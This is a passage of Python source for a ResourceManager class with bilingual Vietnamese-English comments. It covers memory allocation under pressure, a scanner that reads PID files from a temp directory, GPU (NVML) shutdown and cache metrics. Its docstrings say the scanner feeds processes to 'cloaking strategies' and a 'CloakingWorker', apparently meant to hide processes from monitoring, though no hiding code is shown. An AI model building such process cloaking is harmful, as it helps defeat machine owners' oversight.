                        self.logger.info("🧹 [MEMORY REDUCTION] System caches dropped")
            
            # **Step 2: Force garbage collection** (bước 2: buộc thu gom rác)
            import gc
            collected = gc.collect()
            self.logger.info(f"🗑️ [MEMORY REDUCTION] Garbage collection: {collected} objects collected")
            
            # **Step 3: Check if sufficient memory freed** (bước 3: kiểm tra nếu đủ bộ nhớ được giải phóng)
            memory_after = psutil.virtual_memory()
            memory_freed_mb = (memory_before.used - memory_after.used) / (1024 * 1024)
            
            self.logger.info(f"📊 [MEMORY REDUCTION] Freed: {memory_freed_mb:.1f}MB, Usage: {memory_after.percent:.1f}%")
            
            # **Step 4: Decide allocation strategy** (bước 4: quyết định chiến lược cấp phát)
            if memory_after.percent < 80:  # Significant improvement
                self.logger.info("✅ [MEMORY REDUCTION] Sufficient memory freed - proceeding with conservative allocation")
                return self.allocate_conservative(required_mb)
            else:
                # **Emergency allocation with severe reduction** (cấp phát khẩn cấp với giảm nghiêm trọng)
                emergency_mb = min(required_mb * 0.5, memory_after.available / (1024 * 1024) * 0.1)
                self.logger.warning(f"🆘 [MEMORY REDUCTION] Emergency allocation: {emergency_mb:.1f}MB (reduced from {required_mb}MB)")
                
                return {
                    'success': True,
                    'allocated_mb': int(emergency_mb),
                    'strategy': 'emergency_reduced',
                    'memory_pressure': memory_after.percent,
                    'safety_action': f'reduced_allocation_from_{required_mb}MB_to_{emergency_mb:.1f}MB'
                }
                
        except Exception as e:
            self.logger.error(f"❌ [MEMORY REDUCTION] Error during memory reduction: {e}")
            return {
                'success': False,
                'allocated_mb': 0,
                'strategy': 'reduction_failed',
                'memory_pressure': 100.0,
                'safety_action': f'reduction_failed: {e}'
            }
    
    def allocate_conservative(self, required_mb: int) -> Dict[str, Any]:
        """
        **Conservative Memory Allocation** (cấp phát bộ nhớ thận trọng)
        
        Conservative allocation strategy when memory pressure is 75-85%.
        Allocates 80% of requested memory with safety margins.
        
        Args:
            required_mb: Required memory in MB (bộ nhớ yêu cầu)
            
        Returns:
            Dict with allocation result (từ điển với kết quả cấp phát)
        """
        try:
            memory_info = psutil.virtual_memory()
            
            # **Conservative allocation: 80% of requested** (cấp phát thận trọng: 80% yêu cầu)
            conservative_mb = int(required_mb * 0.8)
            available_mb = memory_info.available / (1024 * 1024)
            
            # **Safety check: ensure allocation doesn't exceed 10% of available** (kiểm tra an toàn)
            max_safe_mb = int(available_mb * 0.1)
            final_allocation = min(conservative_mb, max_safe_mb)
            
            self.logger.info(f"⚖️ [CONSERVATIVE ALLOCATION] Requested: {required_mb}MB → Allocated: {final_allocation}MB")
            self.logger.info(f"📊 [CONSERVATIVE ALLOCATION] Available: {available_mb:.1f}MB, Safety limit: {max_safe_mb}MB")
            
            return {
                'success': True,
                'allocated_mb': final_allocation,
                'strategy': 'conservative',
                'memory_pressure': memory_info.percent,
                'safety_action': f'reduced_to_80%_with_safety_limit'
            }
            
        except Exception as e:
            self.logger.error(f"❌ [CONSERVATIVE ALLOCATION] Error during conservative allocation: {e}")
            return {
                'success': False,
                'allocated_mb': 0,
                'strategy': 'conservative_failed',
                'memory_pressure': 0.0,
                'safety_action': f'conservative_failed: {e}'
            }
    
    def allocate_normal(self, required_mb: int) -> Dict[str, Any]:
        """
        **Normal Memory Allocation** (cấp phát bộ nhớ bình thường)
        
        Normal allocation strategy when memory pressure < 75%.
        Allocates full requested memory with basic safety checks.
        
        Args:
            required_mb: Required memory in MB (bộ nhớ yêu cầu)
            
        Returns:
            Dict with allocation result (từ điển với kết quả cấp phát)
        """
        try:
            memory_info = psutil.virtual_memory()
            available_mb = memory_info.available / (1024 * 1024)
            
            # **Normal allocation with safety margin** (cấp phát bình thường với biên an toàn)
            if required_mb <= available_mb * 0.2:  # Request ≤ 20% of available
                allocated_mb = required_mb
                safety_action = 'full_allocation_within_safety_margin'
            else:
                # **Large request: cap at 15% of available memory** (yêu cầu lớn: giới hạn 15% bộ nhớ khả dụng)
                allocated_mb = int(available_mb * 0.15)
                safety_action = f'capped_at_15%_available_memory'
            
            self.logger.info(f"✅ [NORMAL ALLOCATION] Requested: {required_mb}MB → Allocated: {allocated_mb}MB")
            self.logger.info(f"📊 [NORMAL ALLOCATION] Available: {available_mb:.1f}MB, Usage: {memory_info.percent:.1f}%")
            
            return {
                'success': True,
                'allocated_mb': allocated_mb,
                'strategy': 'normal',
                'memory_pressure': memory_info.percent,
                'safety_action': safety_action
            }
            
        except Exception as e:
            self.logger.error(f"❌ [NORMAL ALLOCATION] Error during normal allocation: {e}")
            return {
                'success': False,
                'allocated_mb': 0,
                'strategy': 'normal_failed',
                'memory_pressure': 0.0,
                'safety_action': f'normal_failed: {e}'
            }
    
    def monitor_memory_pressure(self) -> Dict[str, Any]:
        """
        **Memory Pressure Monitoring** (giám sát áp lực bộ nhớ)
        
        Continuous monitoring of system memory pressure with early warnings.
        Called periodically to detect memory pressure trends.
        
        Returns:
            Dict with monitoring data (từ điển với dữ liệu giám sát)
        """
        try:
            memory_info = psutil.virtual_memory()
            usage_percent = memory_info.percent
            available_gb = memory_info.available / (1024 ** 3)
            
            # **Determine pressure level** (xác định mức độ áp lực)
            if usage_percent > 85:
                pressure_level = 'CRITICAL'
                action_required = 'IMMEDIATE'
                self.logger.error(f"🚨 [MEMORY PRESSURE] CRITICAL: {usage_percent:.1f}% - Immediate action required")
            elif usage_percent > 75:
                pressure_level = 'HIGH'
                action_required = 'SOON'
                self.logger.warning(f"⚠️ [MEMORY PRESSURE] HIGH: {usage_percent:.1f}% - Action needed soon")
            elif usage_percent > 65:
                pressure_level = 'MODERATE'
                action_required = 'MONITOR'
                self.logger.info(f"ℹ️ [MEMORY PRESSURE] MODERATE: {usage_percent:.1f}% - Continue monitoring")
            else:
                pressure_level = 'LOW'
                action_required = 'NONE'
                self.logger.debug(f"✅ [MEMORY PRESSURE] LOW: {usage_percent:.1f}% - System healthy")
            
            return {
                'timestamp': time.time(),
                'usage_percent': usage_percent,
                'available_gb': available_gb,
                'pressure_level': pressure_level,
                'action_required': action_required,
                'total_gb': memory_info.total / (1024 ** 3),
                'used_gb': memory_info.used / (1024 ** 3)
            }
            
        except Exception as e:
            self.logger.error(f"❌ [MEMORY PRESSURE] Error during monitoring: {e}")
            return {
                'timestamp': time.time(),
                'usage_percent': 0.0,
                'available_gb': 0.0,
                'pressure_level': 'ERROR',
                'action_required': 'CHECK_SYSTEM',
                'error': str(e)
            }

    def _file_registry_scanner_worker(self) -> None:
        """
        **File-Based Registry Scanner Worker** (worker quét registry dựa trên file)
        
        Background thread để monitor /tmp/ncs_pid_registry/ directory cho new PID files
        được tạo bởi DirectPIDRegistry fallback mechanism. Khi detect files mới,
        process chúng và apply cloaking strategies.
        
        This is part of Shared File-Based Registry solution để giải quyết cross-process
        PID handoff issues khi direct communication fails.
        """
        self.logger.info("📁 [FILE-SCANNER] File registry scanner worker started")
        
        # **Scanner Configuration** (cấu hình scanner)
        scan_interval = 2.0  # Scan every 2 seconds for responsiveness
        processed_files = set()  # Track processed files to avoid duplicates
        last_cleanup_time = time.time()
        cleanup_interval = 300  # Cleanup every 5 minutes
        
        # **Import required modules for file operations** (nhập module cần thiết cho thao tác file)
        import json
        
        # **File registry constants** (hằng số registry file)
        file_registry_dir = Path("/tmp/ncs_pid_registry")
        file_prefix = "pid_"
        file_suffix = ".json"
        
        while not self._stop_flag:
            try:
                current_time = time.time()
                
                # **Periodic cleanup of old processed files tracking** (dọn dẹp định kỳ theo dõi file đã xử lý)
                if current_time - last_cleanup_time >= cleanup_interval:
                    old_size = len(processed_files)
                    # Remove tracking for files that no longer exist
                    processed_files = {f for f in processed_files if (file_registry_dir / f).exists()}
                    new_size = len(processed_files)
                    if old_size != new_size:
                        self.logger.debug(f"🧹 [FILE-SCANNER] Cleaned processed files tracking: {old_size} → {new_size}")
                    last_cleanup_time = current_time
                
                # **Check if registry directory exists** (kiểm tra thư mục registry có tồn tại)
                if not file_registry_dir.exists():
                    time.sleep(scan_interval)
                    continue
                
                # **Scan for PID files** (quét file PID)
                discovered_files = []
                try:
                    for file_path in file_registry_dir.glob(f"{file_prefix}*{file_suffix}"):
                        if file_path.name not in processed_files:
                            discovered_files.append(file_path)
                except Exception as scan_err:
                    self.logger.debug(f"⚠️ [FILE-SCANNER] Directory scan error: {scan_err}")
                    time.sleep(scan_interval)
                    continue
                
                # **Process discovered files** (xử lý file được phát hiện)
                for file_path in discovered_files:
                    try:
                        success = self._process_registry_file(file_path)
                        if success:
                            processed_files.add(file_path.name)
                            self.logger.info(f"✅ [FILE-SCANNER] Successfully processed: {file_path.name}")
                        else:
                            self.logger.warning(f"⚠️ [FILE-SCANNER] Failed to process: {file_path.name}")
                            # **Mark as processed to avoid infinite retries** (đánh dấu đã xử lý để tránh thử lại vô hạn)
                            processed_files.add(file_path.name)
                            
                    except Exception as process_err:
                        self.logger.error(f"❌ [FILE-SCANNER] Error processing {file_path.name}: {process_err}")
                        processed_files.add(file_path.name)  # Mark as processed to avoid retry loops
                
                # **Sleep until next scan** (ngủ đến lần quét tiếp theo)
                time.sleep(scan_interval)
                
            except Exception as worker_err:
                self.logger.error(f"❌ [FILE-SCANNER] Scanner worker error: {worker_err}")
                time.sleep(scan_interval * 2)  # Sleep longer on error
        
        self.logger.info("📁 [FILE-SCANNER] File registry scanner worker stopped")

    def _process_registry_file(self, file_path: Path) -> bool:
        """
        **Process Registry File** (xử lý file registry)
        
        Read và process a single PID registry file created by DirectPIDRegistry fallback.
        Extract PID và metadata, then apply cloaking strategies.
        
        Args:
            file_path: Path to the registry file
            
        Returns:
            bool: True nếu processing successful
        """
        try:
            self.logger.debug(f"📄 [FILE-PROCESS] Processing registry file: {file_path.name}")
            
            # **Atomic read with file locking** (đọc nguyên tử với khóa file)
            import json
            import fcntl
            
            with open(file_path, 'r') as f:
                # **Lock file during read để ensure consistency** (khóa file trong khi đọc để đảm bảo tính nhất quán)
                fcntl.flock(f.fileno(), fcntl.LOCK_SH)  # Shared lock for reading
                file_data = json.load(f)
            
            # **Validate file data structure** (xác thực cấu trúc dữ liệu file)
            required_fields = ['pid', 'timestamp', 'metadata', 'created_by']
            for field in required_fields:
                if field not in file_data:
                    self.logger.error(f"❌ [FILE-PROCESS] Missing required field '{field}' in {file_path.name}")
                    return False
            
            # **Extract PID và metadata** (trích xuất PID và metadata)
            pid = file_data['pid']
            metadata = file_data['metadata']
            file_timestamp = file_data['timestamp']
            created_by = file_data['created_by']
            
            # **Validate PID** (xác thực PID)
            if not isinstance(pid, int) or pid <= 0:
                self.logger.error(f"❌ [FILE-PROCESS] Invalid PID: {pid} in {file_path.name}")
                return False
            
            # **Check if process still exists** (kiểm tra process có còn tồn tại)
            try:
                import psutil
                process_obj = psutil.Process(pid)
                if not process_obj.is_running():
                    self.logger.info(f"ℹ️ [FILE-PROCESS] Process {pid} no longer running - skipping")
                    return True  # Consider this successful (process ended)
            except psutil.NoSuchProcess:
                self.logger.info(f"ℹ️ [FILE-PROCESS] Process {pid} not found - skipping")
                return True
            except Exception as psutil_err:
                self.logger.debug(f"⚠️ [FILE-PROCESS] Could not validate process {pid}: {psutil_err}")
                # Continue processing anyway
            
            # **Log file processing start** (ghi log bắt đầu xử lý file)
            age = time.time() - file_timestamp
            self.logger.info(f"📁 [FILE-PROCESS] Processing PID {pid} from {created_by} (age: {age:.1f}s)")
            
            # **Call receive_from_registry method** (gọi phương thức receive_from_registry)
            # This integrates with existing ResourceManager processing flow
            registry_metadata = {
                **metadata,  # Include all metadata from file
                'source': 'file_registry_scanner',
                'file_path': str(file_path),
                'file_timestamp': file_timestamp,
                'scanner_timestamp': time.time(),
                'age_seconds': age
            }
            
            success = self.receive_from_registry(pid, registry_metadata)
            
            if success:
                self.logger.info(f"✅ [FILE-PROCESS] Successfully processed PID {pid} via file registry")
                
                # **Schedule file cleanup after successful processing** (lên lịch dọn dẹp file sau khi xử lý thành công)
                try:
                    file_path.unlink()  # Remove processed file
                    self.logger.debug(f"🗑️ [FILE-PROCESS] Cleaned up processed file: {file_path.name}")
                except Exception as cleanup_err:
                    self.logger.debug(f"⚠️ [FILE-PROCESS] Could not cleanup file {file_path.name}: {cleanup_err}")
                
                return True
            else:
                self.logger.error(f"❌ [FILE-PROCESS] Failed to process PID {pid} from file registry")
                return False
                
        except json.JSONDecodeError as json_err:
            self.logger.error(f"❌ [FILE-PROCESS] Invalid JSON in {file_path.name}: {json_err}")
            return False
        except Exception as e:
            self.logger.error(f"❌ [FILE-PROCESS] Error processing {file_path.name}: {e}")
            return False

    def shutdown(self):
        """
        **Enhanced Shutdown với Readiness Signal Cleanup** (shutdown nâng cao với dọn dẹp tín hiệu sẵn sàng)
        
        **PHASE 2**: Clear readiness signal during shutdown để ensure clean state.
        """
        self.logger.info("🔄 [PHASE 2] Shutting down ResourceManager với readiness signal cleanup...")
        
        # **PHASE 2: Clear readiness signal first** (xóa tín hiệu sẵn sàng trước tiên)
        self.clear_ready_signal()

        # Bước 0: Chờ hàng đợi cloaking xử lý xong
        self.logger.info("Đợi xử lý xong các tác vụ trong resource_adjustment_queue.")
        self.resource_adjustment_queue.join()
        self.logger.info("Tất cả tác vụ resource_adjustment đã xử lý xong.")

        # Bước 1: Đặt cờ dừng
        self._stop_flag = True

        # Bước 2: Chờ thread "CloakingWorker" dừng
        start_time = time.time()
        timeout = 10
        self.logger.info(f"Chờ tối đa {timeout} giây để dừng CloakingWorker...")

        while time.time() - start_time < timeout:
            if all(not w.is_alive() for w in self.workers):
                self.logger.info("CloakingWorker đã dừng.")
                break
            time.sleep(2)
        else:
            self.logger.warning("CloakingWorker vẫn đang chạy sau thời gian chờ.")

        # Bước 3. Tắt NVML
        try:
            if self.shared_resource_manager:
                self.shared_resource_manager.shutdown_nvml()
                self.logger.info("NVML đã được tắt.")
            else:
                self.logger.warning("Không có shared_resource_manager, bỏ qua tắt NVML.")
        except Exception as e:
            self.logger.error(f"Lỗi khi tắt NVML: {e}")

        # Bước 4. join workers
        for w in self.workers:
            try:
                w.join(timeout=2)
                if w.is_alive():
                    self.logger.warning(f"Thread {w.name} chưa dừng hẳn.")
            except Exception as e:
                self.logger.error(f"Lỗi khi join thread {w.name}: {e}")

        self.logger.info("Dừng ResourceManager... (HOÀN THÀNH)")
    
    def _log_cache_metrics_if_needed(self) -> None:
        """
        ✅ CACHE METRICS: Log cache performance metrics if interval has passed.
        """
        try:
            current_time = time.time()
            if current_time - self.last_cache_metrics_log >= self.cache_metrics_interval:
                metrics = self.shared_resource_manager.strategy_cache.get_metrics()
                
                cache_perf = metrics['cache_performance']
                eviction_stats = metrics['eviction_stats']
                
                self.logger.info(
                    f"📊 [CacheMetrics] Hit rate: {cache_perf['hit_rate_percent']:.1f}% "
                    f"({cache_perf['cache_hits']}/{cache_perf['total_requests']} requests)"
                )
                
                self.logger.info(
                    f"📊 [CacheMetrics] Entries: {cache_perf['total_entries']}/{cache_perf['max_size']} "
                    f"({cache_perf['memory_usage_mb']:.1f}MB), "
                    f"Avg creation: {cache_perf['average_creation_time_ms']:.1f}ms"
                )
                
                if eviction_stats['total_evictions'] > 0:
                    self.logger.info(
                        f"📋 [CacheMetrics] Evictions: {eviction_stats['total_evictions']} "
                        f"(policy: {eviction_stats['eviction_policy']})"
                    )
                
                self.last_cache_metrics_log = current_time
                
        except Exception as e:
            # Don't let metrics logging interfere with main processing
            pass
    
    def get_cache_performance_report(self) -> Dict[str, Any]:
        """
        ✅ CACHE REPORT: Get comprehensive cache performance report.
        
        :return: Cache performance metrics dictionary
        """
        try:
            return self.shared_resource_manager.strategy_cache.get_metrics()
        except Exception as e:
            self.logger.error(f"❌ [CacheReport] Failed to get cache metrics: {e}")
            return {
                'error': str(e),
                'timestamp': time.time(),
                'cache_available': False
            }
